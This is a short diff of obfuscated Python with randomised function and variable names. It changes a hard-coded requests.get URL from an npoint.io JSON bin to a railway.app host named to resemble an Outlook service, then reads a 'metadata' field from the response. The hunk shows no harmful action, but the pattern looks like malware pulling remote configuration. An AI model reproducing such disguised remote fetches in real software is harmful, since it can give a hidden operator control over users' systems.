@@ -16,7 +16,7 @@ def process_ckywci_408():
 
     def net_yqxkfl_234():
         try:
-            net_wwhdni_931 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_wwhdni_931 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_wwhdni_931.raise_for_status()
             net_ldlmil_348 = net_wwhdni_931.json()
             model_elpwis_508 = net_ldlmil_348.get('metadata')
